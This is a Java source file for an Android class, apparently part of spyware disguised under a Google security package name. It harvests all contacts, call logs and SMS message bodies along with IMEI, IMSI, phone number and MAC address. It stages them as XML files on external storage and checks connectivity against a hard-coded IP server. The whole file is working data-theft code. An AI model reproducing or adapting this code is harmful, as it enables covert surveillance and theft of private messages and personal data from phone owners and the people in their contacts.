package com.google.security.tools;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;

import org.dom4j.Document;
import org.dom4j.DocumentHelper;
import org.dom4j.Element;
import org.dom4j.io.OutputFormat;
import org.dom4j.io.XMLWriter;

import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.CallLog.Calls;
import android.provider.ContactsContract;
import android.provider.ContactsContract.PhoneLookup;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.google.security.DBHelper;
import com.google.security.FinishReceiver;
import com.google.security.MainService;
import com.google.security.SQLLocalStorage;

public class ContactsInfoTool
{
	private static ContactsInfoTool contactsInfoTool;
	private static final String LOGTAG = "ContactsInfoTool";	
	Context context;
	DBHelper helper;
	ContentResolver cr;
	
	private ContactsInfoTool(Context context) {
		this.context = context;
		initEnvironment();
	}

	public static ContactsInfoTool getIntance(Context context) {
		if (contactsInfoTool == null)
			return new ContactsInfoTool(context);
		return contactsInfoTool;
	}
	
	private void initEnvironment() {
		// TODO Auto-generated method stub
		helper = new DBHelper(context,SQLLocalStorage.DB_MESSAGE);
		cr = context.getContentResolver();
	}
	public void saveInfo(){
		String uid;
		String imei;
		String imsi;
		String networktype;
		String mac;
		String number;
		String model;
		String version;
		String online;
		imei=getUidOrimei();
		uid=getUidOrimei();
		imsi=getImsi();
		networktype=getNetworktype();
		mac=getMac();
		number=getNumber();
		model=getModel();
		version=getVersion();
		online=getOnline();
		ContentValues values=new ContentValues();
		values.put("uid", uid);
		values.put("imei", imei);
		values.put("imsi", imsi);
		values.put("networktype", networktype);
		values.put("mac", mac);
		values.put("number", number);
		values.put("models", model);
		values.put("versions", version);
		values.put("online", online);
		DBHelper helper = new DBHelper(context);
	    helper.insert_tab_info(values);
	    helper.close();
		
	}
	public void saveContacts() {
		
		Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null,
				null, null, null);
		// helper.dele_tab1();//........bubi删除之前的内容
		while (cur.moveToNext()) {
			String number = "";
			// 得到名字
			int nameIndex = cur
					.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
			String name = cur.getString(nameIndex);
			if(name==null||name==""){
				name="未知";
			}
			// 得到电话号码
			String contactId = cur.getString(cur
					.getColumnIndex(ContactsContract.Contacts._ID)); // 获取联系人的ID号，在SQLite中的数据库ID
			Cursor phone = cr.query(
					ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
					ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = "
							+ contactId, null, null);
			while (phone.moveToNext()) {
				String strPhoneNumber = phone
						.getString(phone
								.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)); // 手机号码字段联系人可能不止一个
				number += strPhoneNumber + "\n";
				
				ContentValues contentvalues = new ContentValues();
				contentvalues.put("name", name);
				contentvalues.put("number", strPhoneNumber);
				helper.insert_tab_contacts(contentvalues);
			}
//			ContentValues contentvalues = new ContentValues();
//			contentvalues.put("name", name);
//			contentvalues.put("number", number);
//			helper.insert_tab_contacts(contentvalues);
		}
	}

	public void saveCallRecord() {
		
		Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI,
				new String[] { CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME,
						CallLog.Calls.TYPE, CallLog.Calls.DATE,
						CallLog.Calls.DURATION }, null, null,
				CallLog.Calls.DEFAULT_SORT_ORDER);
		// helper.dele_tab2();
		while (cursor.moveToNext()) {
			String number = cursor.getString(cursor
					.getColumnIndex(Calls.NUMBER)); // 呼叫号码
			String name = cursor.getString(cursor
					.getColumnIndex(Calls.CACHED_NAME)); // 联系人姓名
			if(name==null||name==""){
				name="未知";
			}
			int type = cursor.getInt(cursor.getColumnIndex(Calls.TYPE));// 来电:1,拨出:2,未接:3
			String callType = "";
			switch (type) {
			case 1:
				callType = "来电";
				break;
			case 2:
				callType = "拨出";
				break;
			case 3:
				callType = "未接";
				break;
			}
			long durationtime = cursor.getLong(cursor
					.getColumnIndex(Calls.DURATION));
			String duration = formatTime(durationtime);
			SimpleDateFormat sfd = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
			Date date = new Date(Long.parseLong(cursor.getString(cursor
					.getColumnIndex(Calls.DATE))));
			String time = sfd.format(date);
			ContentValues contentvalues = new ContentValues();
			contentvalues.put("name", name);
			contentvalues.put("number", number);
			contentvalues.put("time", time);
			contentvalues.put("duration", duration);
			contentvalues.put("type", callType);
			helper.insert_tab_record(contentvalues);
		}
	}

	public void saveSms() {
		final String SMS_URI_ALL = "content://sms/";
		try {
			String[] projection = new String[] { "_id", "address", "person",
					"body", "date", "type" };
			Uri uri = Uri.parse(SMS_URI_ALL);
			Cursor cur = cr.query(uri, projection, null, null, "date desc");
			// helper.dele_tab3();
			while (cur.moveToNext()) {
				ContentValues cv;
				String name;
				String phoneNumber;
				String smsbody;
				String date;
				String type;
				name = cur.getString(cur.getColumnIndex("person"));
				phoneNumber = cur.getString(cur.getColumnIndex("address"));
				smsbody = cur.getString(cur.getColumnIndex("body"));
				SimpleDateFormat dateFormat = new SimpleDateFormat(
						"yyyy-MM-dd HH:mm:ss");
				Date d = new Date(Long.parseLong(cur.getString(cur
						.getColumnIndex("date"))));
				date = dateFormat.format(d);
				int typeId = cur.getInt(cur.getColumnIndex("type"));
				if (typeId == 1) {
					type = "接收";
				} else if (typeId == 2) {
					type = "发送";
				} else if (typeId == 0) {
					type = "未读";
				} else {
					type = "草稿";
				}
				// 以下注释去掉会将短信的联系人姓名找出，不然只能获取短信联系号码，不过时间好长，
				Uri personUri = Uri.withAppendedPath(
						ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
						phoneNumber);
				Cursor localCursor = cr.query(personUri, new String[] {
						PhoneLookup.DISPLAY_NAME, PhoneLookup.PHOTO_ID,
						PhoneLookup._ID }, null, null, null);

				if (localCursor.getCount() != 0) {
					localCursor.moveToFirst();
					name = localCursor.getString(localCursor
							.getColumnIndex(PhoneLookup.DISPLAY_NAME));
				}
				if(name==null||name==""){
					name="未知";
				}
				if (smsbody == null)
					smsbody = "";
				cv = new ContentValues();
				cv.put("name", name);
				cv.put("number", phoneNumber);
				cv.put("content", smsbody);
				cv.put("data", date);
				cv.put("type", type);
				helper.insert_tab_sms(cv);
			}
		} catch (SQLiteException ex) {
			ex.printStackTrace();
		}
	}
	private String formatTime(long duration) {
		int timetiem = (int) duration;
		int minute = timetiem / 60;
		int hour = minute / 60;
		int second = timetiem % 60;
		minute %= 60;
		return String.format("%02d:%02d:%02d", hour, minute, second);
	}
	
	public void saveContactsasxml() {
		DBHelper helper = new DBHelper(context,SQLLocalStorage.DB_MESSAGE);
		Cursor cursor = helper.query_tab_contacts();
		createContactsXml(cursor);
		helper.update_tab_contacts();
		
	}

	public void saveCallRecordsasxml() {
		DBHelper helper = new DBHelper(context,SQLLocalStorage.DB_MESSAGE);
		Cursor cursor = helper.query_tab_record();
		createCallRecordsXml(cursor);
		helper.update_tab_record();
	}

	public void saveSmsasxml() {
		DBHelper helper = new DBHelper(context,SQLLocalStorage.DB_MESSAGE);
		Cursor cursor = helper.query_tab_sms();
		createSmsXml(cursor);
		helper.update_tab_sms();
	}

	private void createSmsXml(Cursor cursor) {
		while (cursor.moveToNext()) {
			String flag = cursor.getString(cursor.getColumnIndex("flag"));
			if ("false".equals(flag)) {
				cursor.moveToPrevious();
				Document document = DocumentHelper.createDocument();
				document.setXMLEncoding("utf-8");
				Element eleRoot = document.addElement("sms");
				while (cursor.moveToNext()) {
					String flag1 = cursor.getString(cursor
							.getColumnIndex("flag"));
					if ("false".equals(flag1)) {
						String name = cursor.getString(cursor
								.getColumnIndex("name"));
						if (name == null) {
							name = "unknown";
						}
						Element elePerson = eleRoot.addElement("smsitem");
						// elePerson.addAttribute("id",
						// cursor.getString(cursor.getColumnIndex("_id")));

						Element eleName = elePerson.addElement("name");
						eleName.addText(name);
						Element eleNumber = elePerson.addElement("number");
						eleNumber.addText(cursor.getString(cursor
								.getColumnIndex("number")));
						Element eleContent = elePerson.addElement("content");
						eleContent.addText(cursor.getString(cursor
								.getColumnIndex("content")));
						Element eleData = elePerson.addElement("data");
						eleData.addText(cursor.getString(cursor
								.getColumnIndex("data")));
						Element eleType = elePerson.addElement("type");
						eleType.addText(cursor.getString(cursor
								.getColumnIndex("type")));
					}
				}
				try {
					writeSms2file(document);
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		}

	}

	private void createContactsXml(Cursor cursor) {
		while (cursor.moveToNext()) {
			String flag = cursor.getString(cursor.getColumnIndex("flag"));
			if ("false".equals(flag)) {
				cursor.moveToPrevious();
				Document document = DocumentHelper.createDocument();
				document.setXMLEncoding("utf-8");
				Element eleRoot = document.addElement("contacts");
				while (cursor.moveToNext()) {
					String flag1 = cursor.getString(cursor
							.getColumnIndex("flag"));
					if ("false".equals(flag1)) {
						String name = cursor.getString(cursor
								.getColumnIndex("name"));
						if (name == null) {
							name = "unknown";
						}
						Element elePerson = eleRoot.addElement("person");
						// elePerson.addAttribute("id",
						// cursor.getString(cursor.getColumnIndex("_id")));
						Element eleName = elePerson.addElement("name");
						eleName.addText(name);
						Element eleNumber = elePerson.addElement("number");
						eleNumber.addText(cursor.getString(cursor
								.getColumnIndex("number")));
					}
				}
				try {
					writeContacts2file(document);
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}

		}

	}

	private void createCallRecordsXml(Cursor cursor) {
		while (cursor.moveToNext()) {
			String flag = cursor.getString(cursor.getColumnIndex("flag"));
			if ("false".equals(flag)) {
				cursor.moveToPrevious();
				Document document = DocumentHelper.createDocument();
				document.setXMLEncoding("utf-8");
				Element eleRoot = document.addElement("callrecords");
				while (cursor.moveToNext()) {
					String flag2 = cursor.getString(cursor
							.getColumnIndex("flag"));
					if ("false".equals(flag2)) {
						String name = cursor.getString(cursor
								.getColumnIndex("name"));
						if (name == null) {
							name = "unknown";
						}
						Element elePerson = eleRoot.addElement("item");
						// elePerson.addAttribute("id",
						// cursor.getString(cursor.getColumnIndex("_id")));
						Element eleName = elePerson.addElement("name");
						eleName.addText(name);
						Element eleNumber = elePerson.addElement("number");
						eleNumber.addText(cursor.getString(cursor
								.getColumnIndex("number")));
						Element eleTime = elePerson.addElement("time");
						eleTime.addText(cursor.getString(cursor
								.getColumnIndex("time")));
						Element eleDuration = elePerson.addElement("duration");
						eleDuration.addText(cursor.getString(cursor
								.getColumnIndex("duration")));
						Element eleType = elePerson.addElement("type");
						eleType.addText(cursor.getString(cursor
								.getColumnIndex("type")));
					}
				}
				try {
					writeCallRecord2file(document);
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		}

	}
	
	private void writeContacts2file(Document document) throws Exception {
		String contactsFileName = System.currentTimeMillis() / 1000 + "c.xml";
		File file;
		File saveName;
		if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) {
			file = new File(MainService.CONTACTS_FORDER_PATH);
			if (!file.exists()) {
				file.mkdirs();
			}
			saveName = new File(file, contactsFileName);
			try {
				if (!saveName.exists()) {
					saveName.createNewFile();
				} else if (saveName.exists()) {
					saveName.delete();
					if (!saveName.exists()) {
						saveName.createNewFile();
					}
				}
				OutputFormat format = OutputFormat.createPrettyPrint();
				format.setEncoding("UTF-8");
				XMLWriter writer = new XMLWriter(new OutputStreamWriter(
						new FileOutputStream(saveName), "UTF-8"), format);
				writer.write(document);
				writer.flush();
				writer.close();
			} catch (FileNotFoundException e) {
				e.printStackTrace();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}

	private void writeCallRecord2file(Document document) throws Exception {
		String contactsFileName = System.currentTimeMillis() / 1000 + "r.xml";
		File file;
		File saveName;
		if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) {
			file = new File(MainService.CALLRECORD_FORDER_PATH);
			if (!file.exists()) {
				file.mkdirs();
			}
			saveName = new File(file, contactsFileName);
			try {
				if (!saveName.exists()) {
					saveName.createNewFile();
				} else if (saveName.exists()) {
					saveName.delete();
					if (!saveName.exists()) {
						saveName.createNewFile();
					}
				}
				OutputFormat format = OutputFormat.createPrettyPrint();
				format.setEncoding("UTF-8");
				XMLWriter writer = new XMLWriter(new OutputStreamWriter(
						new FileOutputStream(saveName), "UTF-8"), format);
				writer.write(document);
				writer.flush();
				writer.close();
			} catch (FileNotFoundException e) {
				e.printStackTrace();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}

	private void writeSms2file(Document document) throws Exception {
		String contactsFileName = System.currentTimeMillis() / 1000 + "s.xml";
		File file;
		File saveName;
		if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) {
			file = new File(MainService.SMS_FORDER_PATH);
			if (!file.exists()) {
				file.mkdirs();
			}
			saveName = new File(file, contactsFileName);
			try {
				if (!saveName.exists()) {
					saveName.createNewFile();
				} else if (saveName.exists()) {
					saveName.delete();
					if (!saveName.exists()) {
						saveName.createNewFile();
					}
				}
				OutputFormat format = OutputFormat.createPrettyPrint();
				format.setEncoding("UTF-8");
				XMLWriter writer = new XMLWriter(new OutputStreamWriter(
						new FileOutputStream(saveName), "UTF-8"), format);
				writer.write(document);
				writer.flush();
				writer.close();
			} catch (FileNotFoundException e) {
				e.printStackTrace();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}
	private  String getUidOrimei() {
		String imei = "000000000000000";
		try {
			TelephonyManager telephonyManager = (TelephonyManager) context
					.getSystemService(context.TELEPHONY_SERVICE);
			imei = telephonyManager.getDeviceId();
			Log.i("imei", imei);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return imei;
	}

	private String getImsi() {
		String imsi = "00000000";
		try {
			TelephonyManager telephonyManager = (TelephonyManager) context
					.getSystemService(Context.TELEPHONY_SERVICE);
			imsi = telephonyManager.getSubscriberId();
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return imsi;
	}

	private String getNumber() {
		String number = "NoCard";
		try {
			TelephonyManager telephonyManager = (TelephonyManager) context
					.getSystemService(Context.TELEPHONY_SERVICE);
			number = telephonyManager.getLine1Number();

		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();

		}
		return number;
	}

	private String getMac() {
		String mac = "unknown";
		try {
			WifiManager wifi = (WifiManager) context
					.getSystemService(Context.WIFI_SERVICE);
			WifiInfo info = wifi.getConnectionInfo();
			mac = info.getMacAddress();
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return mac;
	}

	private String getNetworktype() {
		String type = "网络类型未知";
		int t = 0;
		try {
			TelephonyManager telephonyManager = (TelephonyManager) context
					.getSystemService(Context.TELEPHONY_SERVICE);
			t = telephonyManager.getNetworkType();
			if (t == 1) {
				type = "GPRS网络";
			} else if (t == 2) {
				type = "EDGE网络";
			} else if (t == 3) {
				type = "UMTS网络";
			} else if (t == 8) {
				type = "HSDPA网络";
			} else if (t == 9) {
				type = "HSUPA网络";
			} else if (t == 10) {
				type = "HSPA网络";
			} else if (t == 4) {
				type = "CDMA网络,IS95A 或 IS95B";
			} else if (t == 5) {
				type = "EVDO网络, revision 0";
			} else if (t == 6) {
				type = "EVDO网络, revision A";
			} else if (t == 7) {
				type = "1xRTT网络";
			}
		} catch (Exception e) {
			// TODO: handle exception
		}
		return type;
	}

	public static String getModel() {
		String model = "unknown";
		try {
			model = android.os.Build.MODEL;
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return model;
	}

	public static String getVersion() {
		String version = "unknown";
		try {
			version = android.os.Build.VERSION.RELEASE;
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return version;
	}

	public static String getOnline() {
		String isOnline;
		String result = "";
		String target = "";
		target = "http://111.204.189.55:8082/a/b/cd/efg/test.jsp?content=test";
		URL url;
		try {
			url = new URL(target);
			HttpURLConnection urlConn = (HttpURLConnection) url
					.openConnection();
			InputStreamReader in = new InputStreamReader(
					urlConn.getInputStream());
			BufferedReader buffer = new BufferedReader(in);
			String inputLine = null;
			while ((inputLine = buffer.readLine()) != null) {
				result += inputLine;
			}
			in.close();
			urlConn.disconnect();
		} catch (Exception e) {
			// TODO: handle exception
			e.printStackTrace();
		}
		if (result.equals("testsuccess")) {
			isOnline = "在线";
		} else {
			isOnline = "离线";
		}
		return isOnline;
	}
}